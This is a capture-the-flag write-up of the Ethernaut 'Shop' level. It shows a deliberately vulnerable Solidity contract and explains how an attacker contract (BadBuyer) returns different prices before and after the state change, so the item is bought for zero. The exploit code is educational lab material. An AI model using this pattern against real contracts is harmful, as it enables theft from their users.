# [21. Shop](https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

We had a similar puzzle back in the Elevator level: we need a function to return different things in a single transaction. The most barebones solution would be to check `gasLeft()` and return different results based on it, but here we have a cleaner solution.

```solidity
function buy() public {
  Buyer _buyer = Buyer(msg.sender);

  // during this call, isSold is false
  if (_buyer.price() >= price && !isSold) {
    // the state will change for isSold
    isSold = true;
    // during this call, isSold is true
    price = _buyer.price();
  }
}
```

As commented above, we can query the value of `isSold` and return a different result based on it. Our attacker contract will look like below, assuming we provide the Shop contract and the Buyer interface:

```solidity
contract BadBuyer is Buyer { 
  Shop target;
  constructor(address _target) {
    target = Shop(_target);
  }

  function price() external view override returns (uint) {
    return target.isSold() ? 0 : 100;
  }

  function pwn() public {
    target.buy();
  }
}
```
